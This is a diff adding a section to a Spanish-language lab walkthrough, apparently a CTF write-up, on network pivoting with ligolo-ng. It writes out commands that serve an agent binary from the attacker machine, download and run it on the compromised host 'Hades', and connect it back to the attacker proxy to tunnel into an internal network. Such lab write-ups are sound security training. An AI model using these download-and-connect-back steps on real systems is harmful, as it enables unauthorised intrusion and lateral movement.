@@ -145,4 +145,42 @@ Una vez que el agente se conecta desde Hades, la consola del Proxy mostrará un 
 
 
 
-> **Tip Técnico:** Verifica siempre con `ip route` que la ruta hacia la red `20.20.20.0/24` apunta correctamente a la interfaz `ligolo`. Si no lo haces, intentarás salir por tu puerta de enlace predeterminada (tu router) y no llegarás a Poseidón.
+> **Tip** Verifica siempre con `ip route` que la ruta hacia la red `20.20.20.0/24` apunta correctamente a la interfaz `ligolo`. Si no lo haces, intentarás salir por tu puerta de enlace predeterminada (tu router) y no llegarás a Poseidón.
+
+### 📂 Transferencia y Ejecución del Agente (Hades)
+
+Para que **Hades** actúe como nuestro puente, debemos transferir el binario del agente y ejecutarlo apuntando a nuestra IP de atacante.
+
+#### 1. Preparación en la Máquina Atacante
+Primero, organizamos el binario y levantamos un servidor web temporal para la transferencia:
+
+| Paso | Acción | Comando |
+| :--- | :--- | :--- |
+| **Directorio** | Crear carpeta de trabajo | `mkdir ligolo && cd ligolo` |
+| **Servidor** | Levantar server Python | `python3 -m http.server 80` |
+
+---
+
+#### 2. Descarga y Despliegue en Hades
+Desde la sesión de SSH en **Hades**, procedemos a descargar el agente y darle los privilegios necesarios para su ejecución:
+
+| Acción | Comando | Descripción |
+| :--- | :--- | :--- |
+| **Descarga** | `wget http://10.0.2.15/agent_linux_amd64 -O agent` | Descarga el binario desde nuestra IP. |
+| **Permisos** | `chmod +x agent` | Otorga permisos de ejecución al binario. |
+| **Conexión** | `./agent -connect 10.0.2.15:11601 -ignore-cert` | Conecta el agente a nuestro Proxy local. |
+
+---
+
+### 🚀 Estableciendo la Comunicación
+
+Al ejecutar el comando anterior, verás en tu terminal de **Hades** un mensaje indicando que la conexión ha sido exitosa. 
+
+
+
+> **Nota Crítica:** El flag `-ignore-cert` es fundamental ya que estamos usando un certificado auto-firmado (`-selfcert`) en el proxy. Sin esto, la conexión sería rechazada por motivos de seguridad.
+
+#### Estado del Túnel:
+1. **Proxy Atacante:** Recibe la conexión y crea la sesión.
+2. **Agente Hades:** Mantiene el túnel abierto y redirige el tráfico.
+3. **Resultado:** Ahora podemos gestionar la red interna desde la consola del proxy escribiendo `session`.
